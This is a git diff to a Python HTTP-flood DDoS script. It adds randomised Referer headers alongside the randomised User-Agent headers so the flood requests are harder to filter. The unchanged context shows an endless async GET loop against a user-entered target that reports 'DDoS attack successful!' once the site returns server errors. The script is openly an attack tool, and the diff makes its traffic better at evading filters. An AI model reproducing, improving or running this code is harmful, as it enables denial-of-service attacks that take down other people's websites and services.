@@ -8,6 +8,7 @@ import random
 
 
 headers_useragents = []
+headers_referers = []
 R = '\033[31m' #Aggressive/Alert/Caution/Warning/Failed
 B = '\033[34m' #Normal/Questioning/
 G = '\033[1;32m' #Process Completed/Success/
@@ -15,13 +16,21 @@ Y = '\033[32m' #On Process/Processing/Executing/Deploying/
 
 def dict_headers():
     global headers_useragents
-    with open("useragents.txt", "r") as f:
-        useragents = f.read().splitlines()
+    with open("useragents.txt", "r") as uf:
+        useragents = uf.read().splitlines()
         for useragent in useragents:
             headers_useragents.append(useragent)
 
+def dict_referers():
+    global headers_referers
+    with open("referers.txt", "r") as rf:
+        referers = rf.read().splitlines()
+        for referer in referers:
+            headers_referers.append(referer)
+
 dict_headers()
-        
+dict_referers()
+
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -95,7 +104,7 @@ async def attack(target):
     try:
         async with aiohttp.ClientSession() as session:
             while True:
-                headers = {'User-Agent': random.choice(headers_useragents)}
+                headers = {'User-Agent': random.choice(headers_useragents),'referer': random.choice(headers_referers)}
                 async with session.get(target, headers=headers) as response:
                     if response.status >= 500:
                         print(f"{G}[+] Target Website is down! DDoS attack successful!")
@@ -128,7 +137,7 @@ if __name__ == "__main__":
     input_password = getpass.getpass(f"{B}Enter the password: ")
     if input_password == password:
         target = input(f"{B}Enter the target: ")
-        requests = int(input(f"{B}Enter the requests per second: "))
+        requests = int(input(f"{B}Enter the amount requests: "))
         print(f"{Y}Starting the Attack....")
         asyncio.run(main(target))
     else:
